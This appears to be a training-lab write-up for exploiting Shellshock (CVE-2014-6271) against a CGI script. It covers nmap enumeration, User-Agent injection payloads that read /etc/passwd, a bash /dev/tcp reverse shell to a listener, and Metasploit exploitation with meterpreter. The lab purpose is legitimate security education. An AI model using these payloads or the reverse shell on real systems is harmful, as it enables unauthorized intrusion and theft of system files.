# 🔬Bash

## Lab 1 <a href="#lab-1" id="lab-1"></a>

> 🔬 [Shellshock](https://attackdefense.com/challengedetailsnoauth?cid=1911)
>
> * Target IP: `192.54.253.3`
> * **Bash Exploitation** - [CVE-2014-6071](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6271)

### Enumeration <a href="#enumeration" id="enumeration"></a>

```bash
nmap 192.54.253.0/24
```

<figure><img src="../../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
nmap 192.54.253.3
nmap -sV 192.54.253.3
```

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Check the website via a browser:
  * `http://192.173.104.3/`
* View Page Source
  * `http://192.173.104.3/gettime.cgi`
  * `gettime.cgi` script can be utilized as the attack vector

<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Check if the server is vulnerable to ShellShock

```bash
nmap -sV --script http-shellshock --script-args http-shellshock.uri=/gettime.cgi 192.54.253.3
```

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Manual Exploitation <a href="#manual-exploitation" id="manual-exploitation"></a>

* [Shellshock exploitable environment](https://github.com/opsxcq/exploit-CVE-2014-6271)
* To inject special characters into the `user-agent` HTTP header, [BurpSuite](https://portswigger.net/burp) can be used.
  * Configure FoxyProxy on Firefox, click on Burp Suite in FoxyProxy and run Burp Suite
  * Inside Proxy menu, turn **Intercept On**
* Reload the `/gettime.cgi` webpage in Firefox and intercept the response in BurpSuite and send it to `repeater`.

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Send the request to the **Repeater**
* Replace `User-Agent:` value with characters:

```bash
() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```

* **Send** the request and check the Response

<figure><img src="../../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
() { :; }; echo; echo; /bin/bash -c 'id'
() { :; }; echo; echo; /bin/bash -c 'ps -ef'
```

<figure><img src="../../../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Reverse Shell <a href="#reverse-shell" id="reverse-shell"></a>

* Set up a listener

```bash
nc -nvlp 1234
```

* Open Burp Suite and change the command to connect to the `netcat` listener of the Kali VM. The payload will be:

```bash
() { :; }; echo; echo; /bin/bash -c 'bash -i >&/dev/tcp/192.173.104.2/1234 0>&1'
```

* [About the shell](https://explainshell.com/explain?cmd=bash+-i+%3E%26%2Fdev%2Ftcp%2F192.173.104.2%2F1234+0%3E%261)

<figure><img src="../../../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Automatic Exploitation <a href="#automatic-exploitation" id="automatic-exploitation"></a>

```bash
service postgresql start && msfconsole
msf5 > search shellshock
```



<figure><img src="../../../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
msf5 > use 0
msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > options
msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set RHOSTS 192.54.253.3
msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set TARGETURI /gettime.cgi
msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > run
```

<figure><img src="../../../../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > use 5
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > options
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 192.54.253.3
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /gettime.cgi
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
```

<figure><img src="../../../../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
meterpreter > ls
meterpreter > cat /etc/passwd
meterpreter > sysinfo
meterpreter > getuid
```

<figure><img src="../../../../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>









